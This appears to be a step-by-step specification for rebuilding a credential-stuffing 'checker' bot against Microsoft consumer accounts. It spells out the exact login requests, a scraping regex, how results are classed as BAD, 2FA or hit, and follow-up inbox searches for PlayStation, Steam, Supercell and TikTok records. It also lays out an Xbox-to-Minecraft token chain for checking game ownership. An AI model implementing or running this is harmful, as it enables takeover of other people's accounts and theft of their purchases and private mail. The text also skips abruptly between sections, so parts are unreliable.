PART 1: THE LOGIN FLOW (CRITICAL - THIS IS WHY IT BREAKS)
========================================================

The current bot.py uses the wrong login. Replace the
AkazaBotChecker.login() and get_params() methods entirely.

USE the login flow from hit.py (class UnifiedChecker,
method check()). Here is the exact flow to copy:

STEP 1 - IDP Check (validates account is MSAccount):
  URL: https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}
  Headers: {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"}
  If response contains "Neither", "Both", "Placeholder",
  "OrgId", OR does NOT contain "MSAccount" -> return "BAD"

STEP 2 - OAuth Authorization page:
  URL: https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize
  Params:
    client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59
    scope=profile openid offline_access https://outlook.office.com/M365.Access
    redirect_uri=msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D
    login_hint={email}
    response_type=code
    client_info=1
    haschrome=1
    mkt=en
  Parse from response:
    urlPost: re.search(r'urlPost":"([^"]+)"', text) -> replace "\/" with "/"
    PPFT: re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', text)
  If either not found -> return "BAD"

STEP 3 - Submit credentials:
  POST to urlPost with body:
    i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960
  allow_redirects=False
  Check response:
    If "account or password is incorrect" or "error" in
    response text (lowercase) -> return "BAD"
    If "identity/confirm" or "Abuse" or "locked" in text -> return "BAD"
    If "verify" or "security code" or "authenticator" in
    text (lowercase) -> return "2FA"
    If "consent" in text (lowercase) -> return "2FA"
  Get Location header, extract code= from it.
  Also save MSPCID cookie as cid = cookie.upper()
  If no code found -> return "BAD"

STEP 4 - Token exchange:
  POST https://login.microsoftonline.com/consumers/oauth2/v2.0/token
  Body (form-encoded):
    client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59
    redirect_uri=msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D
    grant_type=authorization_code
    code={code from step 3}
    scope=profile openid offline_access https://outlook.office.com/M365.Access
  If "access_token" not in response -> return "BAD"
  Extract access_token from JSON response.

STEP 5 - Return the access_token and cid to be used in capture.

login() return values must be consistent:
  "BAD" -> bad credentials or account issue
  "2FA" -> needs verification
  None  -> network/parse error
  (access_token, cid) tuple -> success

In check(), handle all of these properly:
  if not result or result in ("BAD", "None"): status = bad
  if result == "2FA": status = 2fa
  if tuple returned: status = hit, run deep_capture

    4-part: r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'
    3-part: r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b'

  If Total > 0: psn = "Yes (N orders)"

E) INBOX SCAN - STEAM (from hit.py check_steam()):

  Query: "noreply@steampowered.com purchase"
  Size: 30
  If Total > 0: steam = "Yes (N purchases)"

F) INBOX SCAN - SUPERCELL (from hit.py check_supercell()):
  POST https://outlook.live.com/search/api/v2/query
  Query: "noreply@id.supercell.com"
  If Total > 0: supercell = "Yes"

G) INBOX SCAN - TIKTOK (from hit.py check_tiktok()):
  POST https://outlook.live.com/search/api/v2/query
  Query: "account.tiktok"
  If Total > 0: tiktok = "Yes"

H) MINECRAFT (from hit.py check_minecraft()):
  This requires a SEPARATE Xbox token chain. Do NOT
  use the outlook access_token for this directly.
  
  Step H1 - Get XBL token:
    POST https://user.auth.xboxlive.com/user/authenticate
    Headers: Content-Type: application/json, Accept: application/json
    Body JSON:
      {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": "d={access_token}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
    Extract: Token, DisplayClaims.xui[0].uhs (userhash)
  
  Step H2 - Get XSTS token:
    POST https://xsts.auth.xboxlive.com/xsts/authorize
    Body JSON:
      {"Properties": {"SandboxId": "RETAIL", "UserTokens": ["{xbl_token}"]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
    Extract XSTS Token
  
  Step H3 - Minecraft login:
    POST https://api.minecraftservices.com/authentication/login_with_xbox
    Body JSON: {"identityToken": "XBL3.0 x={userhash};{xsts_token}"}
    Extract access_token (minecraft_token)
  
  Step H4 - Get profile:
    GET https://api.minecraftservices.com/minecraft/profile
    Header: Authorization: Bearer {minecraft_token}
    If 200: mc = "Yes ({name})"
    Else: mc = "No"

I) KEYWORDS (user-defined keywords to search inbox):
